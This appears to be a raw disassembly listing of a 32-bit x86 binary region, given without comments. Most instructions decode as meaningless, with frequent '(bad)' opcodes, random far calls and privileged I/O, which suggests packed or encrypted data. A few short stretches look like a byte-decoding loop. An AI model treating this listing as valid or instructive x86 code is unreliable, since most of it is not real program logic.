  4065a1:	in     al,0xa5
  4065a3:	push   ebx
  4065a4:	sub    al,0x84
  4065a6:	pop    ebp
  4065a7:	shl    DWORD PTR [ecx+ebx*8+0x46632fa6],1
  4065ae:	bound  edi,QWORD PTR [ebp-0x69]
  4065b1:	push   ecx
  4065b2:	enter  0xc029,0xbf
  4065b6:	sbb    DWORD PTR [esi],0x35
  4065b9:	lods   al,BYTE PTR ds:[esi]
  4065ba:	in     al,dx
  4065bb:	push   ebp
  4065bc:	retf   0x323e
  4065bf:	pop    ebx
  4065c0:	push   esi
  4065c1:	ror    DWORD PTR [edx+edx*4-0x53],1
  4065c5:	pop    esp
  4065c6:	(bad)  
  4065c7:	cdq    
  4065c8:	or     bl,al
  4065ca:	aaa    
  4065cb:	cs mov ch,0xd5
  4065ce:	mov    ebp,0xcee5460b
  4065d3:	pop    ebx
  4065d4:	dec    edx
  4065d5:	mov    ebp,0x1befe740
  4065da:	test   bl,ah
  4065dc:	mov    dh,0xde
  4065de:	mul    DWORD PTR ds:0xc181b3c1
  4065e4:	outs   dx,BYTE PTR ds:[esi]
  4065e5:	lahf   
  4065e6:	xchg   esp,eax
  4065e7:	imul   edi,DWORD PTR ds:0x3a07c4b,0xffffff92
  4065ee:	or     eax,0x9b5bd653
  4065f3:	jp     0x406593
  4065f5:	out    0xdb,eax
  4065f7:	mov    ebp,0x152c650c
  4065fc:	jle    0x4065a6
  4065fe:	(bad)  
  4065ff:	fisub  DWORD PTR [ecx]
  406601:	adc    bl,BYTE PTR [eax]
  406603:	add    al,0xac
  406605:	lods   al,BYTE PTR ds:[esi]
  406606:	jle    0x40660b
  406608:	sub    bl,BYTE PTR [ebx+0x4f93280e]
  40660e:	outs   dx,BYTE PTR ds:[esi]
  40660f:	mov    DWORD PTR [ebp+0x628e8cf3],ebp
  406615:	outs   dx,DWORD PTR ds:[esi]
  406616:	jle    0x406607
  406618:	sub    ch,cl
  40661a:	and    al,0x32
  40661c:	jp     0x4065c5
  40661e:	jno    0x406651
  406620:	enter  0x6997,0x8c
  406624:	sub    al,0x2b
  406626:	ins    BYTE PTR es:[edi],dx
  406627:	add    dh,dh
  406629:	mov    bl,0x9d
  40662b:	pop    esi
  40662c:	pushf  
  40662d:	adc    al,0x36
  40662f:	repz push esi
  406631:	fist   DWORD PTR ds:0x8248d721
  406637:	cwde   
  406638:	imul   ecx,edi,0x1a19270c
  40663e:	imul   edx,DWORD PTR [ebp+0x33],0x4e
  406642:	inc    ebx
  406643:	push   ss
  406644:	(bad)  
  406645:	sub    eax,0xef43a5b7
  40664a:	push   edx
  40664b:	or     al,0x29
  40664d:	call   0x1e6e:0xf3042fdc
  406654:	dec    edx
  406655:	aas    
  406656:	clc    
  406657:	outs   dx,BYTE PTR ds:[esi]
  406658:	inc    esi
  406659:	jmp    0x40660c
  40665b:	fld    QWORD PTR [esi+0x1]
  40665e:	bswap  edx
  406660:	sub    al,0x75
  406662:	fild   QWORD PTR [eax-0x15]
  406665:	(bad)  
  406666:	jno    0x406620
  406668:	jae    0x406689
  40666a:	lahf   
  40666b:	in     eax,dx
  40666c:	enter  0x8b84,0xdf
  406670:	mov    al,0xba
  406672:	outs   dx,DWORD PTR ds:[esi]
  406673:	(bad)  
  406674:	xor    DWORD PTR [ebx-0x77da8e6],edx
  40667a:	pop    esp
  40667b:	ins    DWORD PTR es:[edi],dx
  40667c:	xor    al,0x87
  40667e:	sub    DWORD PTR [ebx],0x144bd420
  406684:	mov    edx,0x9a9d0fdd
  406689:	pop    ss
  40668a:	sub    DWORD PTR ds:0x937d51b8,ecx
  406691:	inc    edi
  406692:	mov    edx,0x28dca370
  406697:	cs inc ecx
  406699:	outs   dx,BYTE PTR ds:[esi]
  40669a:	jge    0x4066d6
  40669c:	adc    al,0x22
  40669e:	jmp    0xa167:0x2e3f64f2
  4066a5:	add    bh,BYTE PTR cs:[ebp-0x20]
  4066a9:	pusha  
  4066aa:	cli    
  4066ab:	sub    eax,DWORD PTR [ecx+0x58063125]
  4066b1:	cdq    
  4066b2:	mov    eax,0x3128373e
  4066b7:	hlt    
  4066b8:	fadd   DWORD PTR [ebx+0x50]
  4066bb:	inc    esp
  4066bc:	ins    BYTE PTR es:[edi],dx
  4066bd:	nop
  4066be:	push   edx
  4066bf:	aad    0x76
  4066c1:	pusha  
  4066c2:	cs js  0x406715
  4066c5:	dec    ecx
  4066c6:	test   eax,0x86fa03a4
  4066cb:	loopne 0x4066c4
  4066cd:	call   0x35d8:0xeed212a9
  4066d4:	pop    ss
  4066d5:	ja     0x4066c5
  4066d7:	jb     0x40667b
  4066d9:	aad    0x28
  4066db:	imul   esp,ebp,0xc
  4066de:	test   al,cl
  4066e0:	lahf   
  4066e1:	inc    eax
  4066e2:	inc    ebp
  4066e3:	mov    WORD PTR [ecx-0x35a766f1],ss
  4066e9:	mov    dh,0x1c
  4066eb:	js     0x4066f5
  4066ed:	push   esi
  4066ee:	pop    ds
  4066ef:	xor    BYTE PTR [ebp-0x625af164],al
  4066f5:	int3   
  4066f6:	cmp    al,0xa8
  4066f8:	fnsave [esi+0x4c]
  4066fb:	adc    cl,BYTE PTR [edi+ebx*1+0x3f]
  4066ff:	jge    0x406690
  406701:	cmp    dh,bh
  406703:	neg    BYTE PTR [ebp-0x72]
  406706:	mov    edx,gs
  406708:	lss    ecx,FWORD PTR [ebx]
  40670b:	and    DWORD PTR [eax-0x2d],edx
  40670e:	retf   0xce24
  406711:	sub    DWORD PTR [ebp+0x31],ecx
  406714:	in     al,0x7e
  406716:	cmp    eax,0x60302782
  40671b:	retf   0x1b43
  40671e:	and    eax,0xb711d491
  406723:	je     0x406794
  406725:	xchg   esi,eax
  406726:	cld    
  406727:	mov    edi,0x32ceb568
  40672c:	mov    dh,0xe4
  40672e:	call   0x29b:0xbe80ebe8
  406735:	repz fs xchg ecx,eax
  406738:	and    DWORD PTR [esi+ecx*1+0x2abfb9e5],0xe14c947
  406743:	sbb    eax,DWORD PTR [ebp+0x717a66e5]
  406749:	and    al,0x79
  40674b:	test   DWORD PTR [eax+0x377a59ee],esp
  406751:	call   DWORD PTR [edx+esi*4+0x46283151]
  406758:	dec    edi
  406759:	lea    edi,[eax-0x1c946c83]
  40675f:	fisubr DWORD PTR [ecx]
  406761:	xchg   esp,eax
  406762:	adc    esp,esp
  406764:	rcr    cl,0x4f
  406767:	(bad)  
  406768:	or     esp,eax
  40676a:	or     ecx,ebp
  40676c:	cli    
  40676d:	jmp    0x80761097
  406772:	ret    0xf0ce
  406775:	outs   dx,BYTE PTR ds:[esi]
  406776:	cmp    DWORD PTR [eax],esp
  406778:	xchg   ebp,eax
  406779:	ret    0x4611
  40677c:	ss loopne 0x4067d8
  40677f:	stos   DWORD PTR es:[edi],eax
  406780:	iret   
  406781:	and    al,0xb3
  406783:	sbb    dh,bh
  406785:	ret    0x9a48
  406788:	cld    
  406789:	lea    esp,[ecx+ecx*2+0x7037d48c]
  406790:	xchg   edi,eax
  406791:	mov    DWORD PTR [ecx-0x3],ecx
  406794:	cmp    cl,cl
  406796:	push   0x1c
  406798:	iret   
  406799:	in     eax,0x9
  40679b:	sub    dl,ch
  40679d:	mov    ch,0x9f
  40679f:	mov    ecx,0xfc322a6b
  4067a4:	(bad)  
  4067a5:	jle    0x4067a2
  4067a7:	mov    dh,0x54
  4067a9:	cdq    
  4067aa:	jge    0x406746
  4067ac:	push   cs
  4067ad:	jge    0x406733
  4067af:	or     esi,DWORD PTR [edx+0x25]
  4067b2:	push   edi
  4067b3:	pop    esp
  4067b4:	rol    DWORD PTR [ecx+0x5caad57b],0x43
  4067bb:	cmp    al,0x43
  4067bd:	scas   eax,DWORD PTR es:[edi]
  4067be:	mov    edx,0x50c40ef5
  4067c3:	pop    eax
  4067c4:	dec    ecx
  4067c5:	sub    DWORD PTR [edx+edx*4-0x47],ebp
  4067c9:	push   cs
  4067ca:	call   0xa996:0xca9f2006
  4067d1:	sbb    esp,esp
  4067d3:	rol    edx,1
  4067d5:	pop    ds
  4067d6:	xchg   BYTE PTR [esi+0x4f77b733],bh
  4067dc:	rcr    BYTE PTR [ebx-0x991169c],cl
  4067e2:	mov    eax,edx
  4067e4:	dec    edi
  4067e5:	mov    edi,DWORD PTR [edi-0x50]
  4067e8:	jg     0x4067a1
  4067ea:	fwait
  4067eb:	imul   ebp,DWORD PTR [ebp-0x34d66ee8],0xffffff9b
  4067f2:	or     BYTE PTR [edi+0x1ed5b44c],al
  4067f8:	lock cs mov al,bl
  4067fc:	mov    eax,ds:0xf7a83f78
  406801:	pushf  
  406802:	mov    bh,0x3c
  406804:	adc    bh,BYTE PTR [edi+0x6685d44b]
  40680a:	jns    0x406861
  40680c:	inc    esi
  40680d:	or     eax,0xe5aa7ddb
  406812:	cmp    cl,BYTE PTR [ebx-0x2a]
  406815:	test   esp,ebx
  406817:	mov    al,BYTE PTR [esi-0x38f278a4]
  40681d:	cmp    eax,0x457b0ef1
  406822:	in     al,dx
  406823:	jg     0x4067eb
  406825:	jnp    0x4067ef
  406827:	pop    es
  406828:	fs dec esi
  40682a:	inc    esp
  40682b:	sub    esp,DWORD PTR [esp+eiz*4+0x1af7978a]
  406832:	fwait
  406833:	xor    esi,DWORD PTR [edx+0x74]
  406836:	mov    ebp,0x4c31f242
  40683b:	dec    ecx
  40683c:	mov    ds:0x648fa79d,eax
  406841:	shr    DWORD PTR [ebp+0x35],0x2d
  406845:	std    
  406846:	out    dx,al
  406847:	sbb    bh,BYTE PTR [edx+0x6]
  40684a:	fstp   DWORD PTR [ebx]
  40684c:	gs (bad) 
  40684e:	mov    ds:0xc96c013f,eax
  406853:	mov    dh,0xa2
  406855:	out    dx,eax
  406856:	dec    edi
  406857:	gs jp  0x406853
  40685a:	and    al,0x74
  40685c:	xchg   ebp,eax
  40685d:	adc    eax,0x54b65f0d
  406862:	inc    eax
  406863:	lods   ax,WORD PTR ds:[esi]
  406865:	and    ah,dl
  406867:	ins    DWORD PTR es:[edi],dx
  406868:	fcom   QWORD PTR [edi+0x79]
  40686b:	out    dx,eax
  40686c:	call   FWORD PTR [ecx-0x2b]
  40686f:	rcl    esi,1
  406871:	popa   
  406872:	mov    bh,ch
  406874:	xchg   edx,eax
  406875:	test   BYTE PTR [ebp-0x25082920],0x33
  40687c:	mov    WORD PTR [edx+0x43],gs
  40687f:	(bad)  
  406880:	lods   al,BYTE PTR ds:[esi]
  406881:	rol    bh,1
  406883:	and    DWORD PTR [edi-0x16],eax
  406886:	fcom   DWORD PTR [edx-0x3cda0c6]
  40688c:	mov    BYTE PTR [ecx],bh
  40688e:	xchg   DWORD PTR [ecx-0x49da79a5],edi
  406894:	add    ch,BYTE PTR [esi-0x4f]
  406897:	mov    DWORD PTR [eax-0x6efb45cc],edx
  40689d:	xchg   bh,bh
  40689f:	and    eax,0xe093df95
  4068a4:	pop    es
  4068a5:	jmp    0x766d6c24
  4068aa:	push   ebx
  4068ab:	push   edx
  4068ac:	sti    
  4068ad:	add    eax,0xf2cbcbd4
  4068b2:	xor    eax,0xaf35c7e9
  4068b7:	(bad)  
  4068b8:	jmp    0xa0:0x522ada1f
  4068bf:	xchg   ecx,eax
  4068c0:	dec    ecx
  4068c1:	jb     0x4068dd
  4068c3:	adc    al,0x1d
  4068c5:	mov    WORD PTR [ebp+eiz*2+0x339a723c],cs
  4068cc:	add    eax,0x91e7f38f
  4068d1:	pop    ss
  4068d2:	pop    ebp
  4068d3:	shl    DWORD PTR [ebx+0x737bc3b7],1
  4068d9:	xor    eax,DWORD PTR [ecx-0x693c0929]
  4068df:	inc    ecx
  4068e0:	pop    esp
  4068e1:	(bad)  
  4068e3:	test   al,0xc6
  4068e5:	aaa    
  4068e6:	(bad)  
  4068e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4068e8:	push   eax
  4068e9:	adc    eax,0xef9e7671
  4068ee:	call   0xc3047205
  4068f3:	out    0xca,al
  4068f5:	not    DWORD PTR [edx]
  4068f7:	and    bl,BYTE PTR [edi+eiz*4]
  4068fa:	sysret 
  4068fc:	arpl   WORD PTR [edx],ax
  4068fe:	in     al,dx
  4068ff:	dec    ebp
  406900:	pusha  
  406901:	add    eax,0x677cf96e
  406906:	mov    ah,0x66
  406908:	sbb    al,0xf6
  40690a:	push   es
  40690b:	in     eax,dx
  40690c:	sbb    BYTE PTR [eax+0x629a2c5],bl
  406912:	sub    ecx,DWORD PTR [ecx]
  406914:	push   ebp
  406915:	sub    BYTE PTR [ebx-0x3f],dh
  406918:	loope  0x406938
  40691a:	mov    ecx,DWORD PTR [ebp-0x14]
  40691d:	xor    eax,edi
  40691f:	xor    edx,edx
  406921:	or     eax,edx
  406923:	mov    cl,BYTE PTR [eax+ecx*1]
  406926:	mov    eax,DWORD PTR [ebp-0x34]
  406929:	or     BYTE PTR [eax],cl
  40692b:	mov    eax,DWORD PTR [ebp-0x10]
  40692e:	mov    ecx,DWORD PTR [ebp-0xc]
  406931:	shrd   eax,ecx,0x2
  406935:	shr    ecx,0x2
  406938:	mov    ecx,DWORD PTR [ebp-0x10]
  40693b:	mov    edx,DWORD PTR [ebp-0xc]
  40693e:	xor    eax,edi
  406940:	shl    ecx,0x1e
  406943:	xor    edx,edx
  406945:	or     eax,edx
  406947:	lea    eax,[ebp+eax*1-0x4]
  40694b:	mov    DWORD PTR [ebp-0x34],eax
  40694e:	mov    eax,DWORD PTR [ebp-0x10]
  406951:	mov    ecx,DWORD PTR [ebp-0xc]
  406954:	shrd   eax,ecx,0x2
  406958:	shr    ecx,0x2
  40695b:	mov    ecx,DWORD PTR [ebp-0x10]
  40695e:	mov    edx,DWORD PTR [ebp-0xc]
  406961:	xor    eax,edi
  406963:	jmp    0x406d41
  406968:	arpl   WORD PTR [eax],di
  40696a:	test   eax,0x2284a205
  40696f:	ss xchg esp,eax
  406971:	scas   al,BYTE PTR es:[edi]
  406972:	addr16 mov esp,0xbcd715c7
  406978:	test   DWORD PTR [ebx+0x129e1818],edx
  40697e:	sbb    BYTE PTR [eax],bl
  406980:	or     ch,ch
  406982:	sbb    ecx,esp
  406984:	jnp    0x40697a
  406986:	jmp    0x406931
  406988:	fwait
  406989:	popa   
  40698a:	cmp    eax,edx
  40698c:	fldcw  WORD PTR [ebx+ecx*4+0x65ffd4a2]
  406993:	sbb    BYTE PTR [esi+0x4e],al
  406996:	xchg   edi,eax
  406997:	jae    0x406921
  406999:	mov    bh,0xc1
  40699b:	xchg   BYTE PTR [ecx+ebp*1],ch
  40699e:	xlat   BYTE PTR ds:[ebx]
  40699f:	sub    ah,BYTE PTR fs:[ebp-0xc19fefa]
  4069a6:	add    DWORD PTR ds:0x91472da3,eax
  4069ac:	std    
  4069ad:	mov    DWORD PTR [eax+esi*2+0x68b30ed0],ebx
  4069b4:	ret    0x15ae
  4069b7:	push   edi
  4069b8:	leave  
  4069b9:	jo     0x4069ca
  4069bb:	aas    
  4069bc:	push   ebx
  4069bd:	lods   al,BYTE PTR ds:[esi]
  4069be:	sub    eax,0x607b1f9c
  4069c3:	mov    ebx,0xc325c98d
  4069c8:	scas   al,BYTE PTR es:[edi]
  4069c9:	fcomp  DWORD PTR [ecx+0x2fde77d5]
  4069cf:	push   ebp
  4069d0:	xor    bl,BYTE PTR [eax+0x516bd50e]
  4069d6:	test   BYTE PTR [ebx+0x6d],0x2
  4069da:	mov    esi,0xa901dc04
  4069df:	loope  0x40699f
  4069e1:	add    edi,ebp
  4069e3:	pusha  
  4069e4:	pop    ebp
  4069e5:	mov    ecx,0x4a86bc7b
  4069ea:	or     DWORD PTR [esi],ebx
  4069ec:	xor    eax,0x5e504c93
  4069f1:	and    al,0xb7
  4069f3:	dec    esi
  4069f4:	out    0x9c,al
  4069f6:	pop    eax
  4069f7:	cli    
  4069f8:	adc    edi,DWORD PTR [edx+0x5b]
  4069fb:	push   ecx
  4069fc:	fcmovbe st,st(6)
  4069fe:	lods   al,BYTE PTR ds:[esi]
  4069ff:	mov    ?,WORD PTR cs:[ebp-0xd]
  406a03:	cmp    al,0xe3
  406a05:	or     DWORD PTR [eax-0x3e0f15e9],edi
  406a0b:	sbb    ebx,edx
  406a0d:	es aas 
  406a0f:	adc    BYTE PTR [edx],0x40
  406a12:	ja     0x406a75
  406a14:	das    
  406a15:	xchg   edi,eax
  406a16:	mov    bh,0xb0
  406a18:	dec    ecx
  406a19:	pop    ecx
  406a1a:	rcl    BYTE PTR [ecx],0xdd
  406a1d:	mov    ah,0x67
  406a1f:	sub    esp,ebp
  406a21:	jl     0x406a8a
  406a23:	cmp    DWORD PTR [esi+edx*8],0x90bdad81
  406a2a:	iret   
  406a2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a2c:	add    BYTE PTR [ebx+0x6fcbbf5a],al
  406a32:	(bad)  
  406a33:	call   0xb0277681
  406a38:	lea    esp,[ebp-0x75b79778]
  406a3e:	jle    0x406ab1
  406a40:	jnp    0x406a36
  406a42:	ins    DWORD PTR es:[edi],dx
  406a43:	pop    ebx
  406a44:	and    al,BYTE PTR [esi]
  406a46:	inc    ax
  406a48:	xchg   esi,eax
  406a49:	ds push 0x38
  406a4c:	dec    ebp
  406a4d:	push   0xffffffb7
  406a4f:	pop    ss
  406a50:	pop    ecx
  406a51:	sbb    dl,cl
  406a53:	xchg   esi,eax
  406a54:	outs   dx,DWORD PTR ds:[esi]
  406a55:	adc    DWORD PTR [edi+0x59],ebp
  406a58:	aad    0xc5
  406a5a:	adc    DWORD PTR [ebp+0xf59541],ecx
  406a60:	aaa    
  406a61:	or     eax,esp
  406a63:	or     dh,bh
  406a65:	iret   
  406a66:	push   0x6f5fcf00
  406a6b:	mov    ch,0x58
  406a6d:	dec    ebx
  406a6e:	mov    ebp,0x2b3b6651
  406a73:	sbb    BYTE PTR cs:[esi+0x4e],al
  406a77:	loopne 0x406a7b
  406a79:	inc    edi
  406a7a:	jmp    0x236:0xa361609
  406a81:	test   BYTE PTR [edi+0x5d],bl
  406a84:	sbb    al,0xad
  406a86:	add    eax,0x9cae104d
  406a8b:	sbb    eax,esp
  406a8d:	dec    edi
  406a8e:	add    al,0xb2
  406a90:	fs out 0x4,al
  406a93:	scas   eax,DWORD PTR es:[edi]
  406a94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a95:	cwde   
  406a96:	gs cdq 
  406a98:	mov    eax,0x55aab2ed
  406a9d:	pop    eax
  406a9e:	xor    al,0x7d
  406aa0:	pushf  
  406aa1:	je     0x406b0c
  406aa3:	dec    eax
  406aa4:	lahf   
  406aa5:	scas   eax,DWORD PTR es:[edi]
  406aa6:	push   0x275a8a7
  406aab:	sahf   
  406aac:	ret    0x7e84
  406aaf:	(bad)  
  406ab0:	mul    DWORD PTR [esi+esi*1]
  406ab3:	pop    esp
  406ab4:	test   eax,0x3f8747fa
  406ab9:	push   esi
  406aba:	mov    DWORD PTR [ebp-0x6c9c9538],ecx
  406ac0:	dec    edx
  406ac1:	lock ins DWORD PTR es:[edi],dx
  406ac3:	mov    bh,BYTE PTR [eax-0x4d]
  406ac6:	jo     0x406b3c
  406ac8:	sub    eax,ebx
  406aca:	ins    DWORD PTR es:[edi],dx
  406acb:	les    edi,FWORD PTR [ebx+esi*2+0x29058623]
  406ad2:	in     eax,dx
  406ad3:	xor    eax,0x8d2ef985
  406ad8:	sub    al,0x1d
  406ada:	ficomp DWORD PTR [ebx-0x69]
  406add:	aaa    
  406ade:	adc    eax,edx
  406ae0:	repnz xor eax,0xe66bc566
  406ae6:	ins    DWORD PTR es:[edi],dx
  406ae7:	mov    BYTE PTR [edi],bh
  406ae9:	(bad)  
  406aea:	sbb    al,0xe7
  406aec:	mov    ebp,0xdcd2fa05
  406af1:	lods   eax,DWORD PTR ds:[esi]
  406af2:	xor    esp,ebx
  406af4:	call   0x2110e4b9
  406af9:	xor    bl,bl
  406afb:	inc    ebp
  406afc:	call   0xb5884936
  406b01:	xor    ebp,DWORD PTR [eax+ecx*8]
  406b04:	adc    DWORD PTR [eax-0xfb33599],ebx
  406b0a:	xor    BYTE PTR [esi+0x1d97696b],cl
  406b10:	stos   BYTE PTR es:[edi],al
  406b11:	nop
  406b12:	mov    dl,BYTE PTR [ebx+0x52b1b606]
  406b18:	cld    
  406b19:	mov    ah,0x95
  406b1b:	dec    edi
  406b1c:	xchg   ebx,eax
  406b1d:	loop   0x406ab7
  406b1f:	fld    TBYTE PTR [edx-0x11]
  406b22:	mov    ebx,0x31ef90fd
  406b27:	hlt    
  406b28:	arpl   WORD PTR [edx],si
  406b2a:	fmulp  st(7),st
  406b2c:	icebp  
  406b2d:	jae    0x406b1f
  406b2f:	out    0x28,al
  406b31:	xchg   esi,eax
  406b32:	inc    ecx
  406b33:	sub    cl,ch
  406b35:	mov    bh,0x88
  406b37:	ror    DWORD PTR [eax-0x53d1a558],0xbc
  406b3e:	push   esi
  406b3f:	xchg   ecx,eax
  406b40:	cld    
  406b41:	mov    ecx,0x5574ca7d
  406b46:	addr16 jge 0x406afa
  406b49:	xchg   edx,eax
  406b4a:	ins    DWORD PTR es:[edi],dx
  406b4b:	xchg   esi,eax
  406b4c:	dec    ebx
  406b4d:	test   al,0xa1
  406b4f:	push   esp
  406b50:	mov    ebx,0xc49f22cb
  406b55:	dec    ebp
  406b56:	stos   DWORD PTR es:[edi],eax
  406b57:	mov    eax,ds:0xa7ad1c08
  406b5c:	lds    ecx,FWORD PTR [ebx]
  406b5e:	mov    dl,0xd9
  406b60:	adc    al,0x4
  406b62:	clc    
  406b63:	inc    ebx
  406b64:	clc    
  406b65:	xor    eax,0xc3621724
  406b6a:	sbb    BYTE PTR [edx-0x6ed93c5c],0xf1
  406b71:	mov    dh,0xb6
  406b73:	mov    dh,0xd0
  406b75:	pop    ebp
  406b76:	mov    ds,ecx
  406b78:	mov    eax,0xf8b90807
  406b7d:	std    
  406b7e:	inc    edx
  406b7f:	push   0x37
  406b81:	pop    esp
  406b82:	jge    0x406bca
  406b84:	inc    edx
  406b85:	push   esi
  406b86:	add    eax,0x4a6d3a0a
  406b8b:	in     eax,dx
  406b8c:	mov    ds:0xe13ace64,al
  406b91:	cmp    ah,al
  406b93:	xor    eax,0x45aa24cd
  406b98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406b99:	pop    edx
  406b9a:	loop   0x406bf8
  406b9c:	bound  edi,QWORD PTR [edx+0x56190b5d]
  406ba2:	fisubr DWORD PTR [ebx-0x52]
  406ba5:	push   esp
  406ba6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ba7:	dec    ebp
  406ba8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ba9:	pop    ebx
  406baa:	in     al,0x6f
  406bac:	mov    ss,WORD PTR [edi]
  406bae:	inc    esp
  406bb0:	cli    
  406bb1:	(bad)  
  406bb3:	and    BYTE PTR [ecx],ch
  406bb5:	mov    bh,BYTE PTR [edi+0x15501180]
  406bbb:	and    al,0x8f
  406bbd:	ins    BYTE PTR es:[edi],dx
  406bbe:	pop    edx
  406bbf:	ins    BYTE PTR es:[edi],dx
  406bc0:	out    dx,eax
  406bc1:	sbb    edx,DWORD PTR [esi+0x3e0af69b]
  406bc7:	mov    BYTE PTR [ebx+0x7dcb3b07],cl
  406bcd:	lods   al,BYTE PTR ds:[esi]
  406bce:	cmp    al,0x55
  406bd0:	sub    eax,0x726421b0
  406bd5:	and    di,bp
  406bd8:	shr    DWORD PTR [ebp+0x51],1
  406bdb:	pop    es
  406bdc:	sar    BYTE PTR [ebx-0x7c92470b],cl
  406be2:	sti    
  406be3:	cmp    BYTE PTR [ebp+0x5c9d210c],ch
  406be9:	iret   
  406bea:	fstp   DWORD PTR [eax+0x66]
  406bed:	jb     0x406c51
  406bef:	and    BYTE PTR [esi+0x2f],bh
  406bf2:	fild   WORD PTR [edi+0x28]
  406bf5:	or     al,0x6
  406bf7:	mov    ecx,0x87addc49
  406bfd:	mov    ecx,0x15f5f419
  406c02:	mov    WORD PTR [edi-0x6b],ss
  406c05:	dec    ebp
  406c06:	outs   dx,DWORD PTR ds:[esi]
  406c07:	add    BYTE PTR [eax],bl
  406c09:	inc    ecx
  406c0a:	shl    bl,0x92
  406c0d:	sub    al,0xd6
  406c0f:	dec    ebp
  406c10:	sub    eax,0x45d5f860
  406c15:	mov    bh,0x4d
  406c17:	imul   edx,DWORD PTR [edx+ecx*1-0x7a2aafc6],0xffffffa9
  406c1f:	mov    bl,0x39
  406c21:	call   0x21931021
  406c26:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  406c28:	or     al,0x7b
  406c2a:	cwde   
  406c2b:	fisttp QWORD PTR [eax]
  406c2d:	and    DWORD PTR [edx+0x6c],ebp
  406c30:	lock mov ebp,0x3e9f2822
  406c36:	clc    
  406c37:	cmp    al,cl
  406c39:	in     eax,0xf7
  406c3b:	call   0x5c5e:0x8f34a080
  406c42:	push   edi
  406c43:	loop   0x406bc6
  406c45:	call   0x66c98560
  406c4a:	push   esi
  406c4b:	inc    ebp
  406c4c:	pop    ss
  406c4d:	sbb    BYTE PTR [edi],cl
  406c4f:	pushf  
  406c50:	mov    bh,0xe6
  406c52:	add    eax,0x6eaa53de
  406c57:	cwde   
  406c58:	outs   dx,DWORD PTR ds:[esi]
  406c59:	inc    esi
  406c5a:	outs   dx,BYTE PTR ds:[esi]
  406c5b:	or     edi,DWORD PTR fs:[edi+0x69a8bdad]
  406c62:	inc    ebp
  406c63:	add    eax,0x7673e31c
  406c68:	pop    ss
  406c69:	jbe    0x406c50
  406c6b:	xchg   BYTE PTR [eax+edi*8],bh
  406c6e:	neg    al
  406c70:	adc    eax,0xcc89807e
  406c75:	ja     0x406c29
  406c77:	cwde   
  406c78:	mov    BYTE PTR [edx+0x7dc90e2a],dl
  406c7e:	or     BYTE PTR [eax+0x4],dh
  406c81:	xchg   ecx,eax
  406c83:	test   ah,ah
  406c85:	push   ss
  406c86:	outs   dx,DWORD PTR ds:[esi]
  406c87:	jns    0x406c35
  406c89:	adc    BYTE PTR [eax+0xd],0x3e
  406c8d:	mov    DWORD PTR [esp+0x2c929b76],edx
  406c94:	mov    ds:0x471ebf1c,al
  406c99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c9a:	leave  
  406c9b:	lods   eax,DWORD PTR ds:[esi]
  406c9c:	shl    ebx,1
  406c9e:	ins    BYTE PTR es:[edi],dx
  406c9f:	sbb    al,0x69
  406ca1:	mov    eax,0x5f330257
  406ca6:	mov    esp,es
  406ca8:	call   0xc64f2748
  406cad:	mov    ah,0x4b
  406caf:	jecxz  0x406d12
  406cb1:	add    BYTE PTR [esi-0x35562f4f],0xe2
  406cb8:	mov    esi,0x2c5d6029
  406cbd:	aas    
  406cbe:	push   0x53
  406cc0:	pop    eax
  406cc1:	shr    DWORD PTR [eax+0x40cbf6fe],cl
  406cc7:	std    
  406cc8:	pop    ecx
  406cc9:	mov    edx,0x4df09dc9
  406cce:	aas    
  406ccf:	div    DWORD PTR [esi]
  406cd1:	retf   
  406cd2:	push   edx
  406cd3:	add    DWORD PTR [ebx],esp
  406cd5:	in     al,dx
  406cd6:	sbb    eax,0x61b6d704
  406cdb:	(bad)  
  406cdc:	in     al,0xc6
  406cde:	test   al,0x68
  406ce0:	mov    cl,0xa7
  406ce2:	ds bswap edx
  406ce5:	ja     0x406cf7
  406ce7:	neg    BYTE PTR [edi-0x8]
  406cea:	sbb    DWORD PTR [ebx],esi
  406cec:	inc    ecx
  406ced:	das    
  406cee:	mov    ecx,0x8f4b5a14
  406cf3:	pop    es
  406cf4:	test   al,0x63
  406cf6:	push   esi
  406cf7:	fwait
  406cf8:	cwde   
  406cf9:	xor    bh,BYTE PTR [esi+0x1c]
  406cfc:	cdq    
  406cfd:	pop    esp
  406cfe:	stos   DWORD PTR es:[edi],eax
  406cff:	xor    edi,DWORD PTR [esi+0x56]
  406d02:	mov    BYTE PTR ds:0x2fd64648,bh
  406d08:	lods   eax,DWORD PTR ds:[esi]
  406d09:	korw   k5,k6,k4
  406d0d:	jge    0x406cb4
  406d0f:	mov    al,ds:0x87b96a35
  406d14:	adc    esi,DWORD PTR [ebp+0x371b4fef]
  406d1a:	and    DWORD PTR [edx],0x53d45fa1
  406d20:	adc    BYTE PTR [edx+ebp*2],dh
  406d23:	int    0x4
  406d25:	aam    0xfb
  406d27:	adc    ebp,esi
  406d29:	ficom  DWORD PTR [ecx+0x72]
  406d2c:	arpl   WORD PTR [ecx+0x41],di
  406d2f:	lds    ebx,FWORD PTR [esp+ebp*1]
  406d32:	arpl   WORD PTR [ebx+0x28],bx
  406d35:	add    cl,BYTE PTR [edx+0x46cbcae7]
  406d3b:	mov    eax,0x655d4c95
  406d40:	xor    al,0xc1
  406d42:	loope  0x406d62
  406d44:	mov    ecx,DWORD PTR [ebp-0x14]
  406d47:	xor    edx,edx
  406d49:	or     eax,edx
  406d4b:	mov    cl,BYTE PTR [eax+ecx*1]
  406d4e:	mov    eax,DWORD PTR [ebp-0x34]
  406d51:	add    BYTE PTR [eax],cl
  406d53:	mov    eax,DWORD PTR [ebp-0x60]
  406d56:	mov    ecx,DWORD PTR [ebp-0x5c]
  406d59:	shrd   eax,ecx,0x2
  406d5d:	shr    ecx,0x2
  406d60:	mov    ecx,DWORD PTR [ebp-0x60]
  406d63:	mov    edx,DWORD PTR [ebp-0x5c]
  406d66:	xor    eax,edi
  406d68:	xor    edx,edx
  406d6a:	or     eax,edx
  406d6c:	lea    eax,[ebp+eax*1-0x4]
  406d70:	mov    DWORD PTR [ebp-0x34],eax
  406d73:	mov    eax,DWORD PTR [ebp-0x60]
  406d76:	shl    ecx,0x1e
  406d79:	mov    ecx,DWORD PTR [ebp-0x5c]
